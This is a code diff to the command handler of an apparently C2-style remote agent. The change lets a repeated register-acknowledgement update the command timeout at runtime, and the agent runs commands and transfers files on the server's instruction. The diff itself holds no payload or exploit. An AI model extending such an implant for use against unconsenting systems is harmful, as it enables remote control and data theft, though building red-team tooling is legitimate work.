@@ -21,6 +21,7 @@ from common.protocol import (
     CMD_DOWNLOAD,
     CMD_HEARTBEAT,
     CMD_HEARTBEAT_ACK,
+    CMD_REGISTER_ACK,
     CMD_REGISTER_RESPONSE,
     CMD_SHUTDOWN,
     CMD_UPLOAD,
@@ -61,10 +62,12 @@ class Handler:
 
     def __init__(
         self,
-        cmd_timeout: int = 60,
+        runtime,
         on_shutdown: Optional[Callable] = None,
     ) -> None:
-        self._cmd_timeout = cmd_timeout
+        # runtime is a RuntimeConfig shared with AgentClient; the ACK updates
+        # it and command execution reads the current value every time.
+        self._runtime = runtime
         self._reader = PacketReader()
         self._write_lock: Optional[asyncio.Lock] = None
         self._on_shutdown = on_shutdown
@@ -117,6 +120,17 @@ class Handler:
             logger.debug(f"recv register_response req_id={req_id}: {body!r}")
             return
 
+        if cmd == CMD_REGISTER_ACK:
+            # The handshake consumes the first ACK; a repeated one refreshes
+            # the runtime timing without reconnecting.
+            try:
+                params = decode_tlv(body)
+                if len(params) >= 2:
+                    self._runtime.update(int(params[0]), int(params[1]))
+            except Exception:
+                logger.warning("invalid repeated register_ack")
+            return
+
         if cmd == CMD_SHUTDOWN:
             logger.info(f"recv shutdown cmd req_id={req_id}; terminating")
             try:
@@ -143,7 +157,9 @@ class Handler:
             # slow file op does not block the asyncio loop: the heartbeat task
             # and the read loop must keep running or the C2 watchdog could
             # disconnect the agent mid-command.
-            result = await asyncio.to_thread(exec_action, name, params, cmd_timeout=self._cmd_timeout)
+            result = await asyncio.to_thread(
+                exec_action, name, params, cmd_timeout=self._runtime.cmd_timeout()
+            )
             result = _cap_output(result)
             logger.debug(f"exec result req_id={req_id} action={name} -> {result!r}")
             await self._write_packet(writer, encode_response(req_id, cmd, result))
